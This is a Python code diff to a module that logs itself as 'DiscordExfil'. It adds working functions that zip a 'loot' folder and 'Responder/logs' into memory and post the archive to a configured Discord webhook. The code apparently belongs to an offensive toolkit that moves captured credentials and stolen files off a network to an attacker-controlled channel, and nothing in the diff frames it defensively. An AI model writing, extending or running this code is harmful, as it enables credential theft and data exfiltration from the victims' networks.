@@ -2,7 +2,12 @@
 import os
 import json
 import requests
+import io
+import zipfile
 from datetime import datetime
+from pathlib import Path
+
+DISCORD_ATTACHMENT_LIMIT = 8 * 1024 * 1024  # 8 MiB typical non-Nitro limit
 
 def get_discord_webhook_url():
     """
@@ -130,3 +135,59 @@ def send_file_to_discord(file_path: str, title: str = None, description: str = N
     except Exception as e:
         print(f"[DiscordExfil] Error sending file: {e}")
         return False
+    
+def send_buffer_to_discord(buffer: io.BytesIO, filename: str, message: str | None = None) -> bool:
+    """Upload an in-memory buffer as a file to the configured webhook."""
+    webhook_url = get_discord_webhook_url()
+    if not webhook_url:
+        print('[DiscordExfil] No webhook configured.')
+        return False
+    try:
+        files = {'file': (filename, buffer, 'application/zip')}
+        payload = {"content": message or f"📦 {filename}"}
+        resp = requests.post(webhook_url, data=payload, files=files, timeout=60)
+        if 200 <= resp.status_code < 300:
+            print('[DiscordExfil] Archive sent successfully.')
+            return True
+        print(f"[DiscordExfil] Archive upload failed: {resp.status_code} - {resp.text}")
+        return False
+    except Exception as e:
+        print(f"[DiscordExfil] Error sending archive: {e}")
+        return False
+
+def _zip_add_dir(zf: zipfile.ZipFile, base_dir: Path, arc_prefix: str = ""):
+    """Recursively add directory contents to zip file preserving relative paths."""
+    try:
+        if not base_dir.exists():
+            return
+        for path in base_dir.rglob('*'):
+            if path.is_file():
+                # Build archive name (optionally under arc_prefix)
+                rel = path.relative_to(base_dir.parent).as_posix()
+                arcname = f"{arc_prefix}/{rel}" if arc_prefix else rel
+                zf.write(path, arcname)
+    except Exception as e:
+        print(f"[DiscordExfil] Error zipping {base_dir}: {e}")
+
+def build_loot_archive(root_path: str) -> tuple[io.BytesIO, str, int] | tuple[None, str, int]:
+    """Create an in-memory ZIP of loot/ and Responder/logs.
+
+    Returns:
+        (buffer, filename, size) on success, (None, error_message, 0) on failure.
+    """
+    try:
+        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f"loot_{ts}.zip"
+        loot_dir = Path(root_path) / 'loot'
+        responder_logs = Path(root_path) / 'Responder' / 'logs'
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
+            if loot_dir.exists():
+                _zip_add_dir(zf, loot_dir)
+            if responder_logs.exists():
+                _zip_add_dir(zf, responder_logs, arc_prefix='Responder/logs')
+        buf.seek(0)
+        size = buf.getbuffer().nbytes
+        return buf, filename, size
+    except Exception as e:
+        return None, f"Archive error: {e}", 0
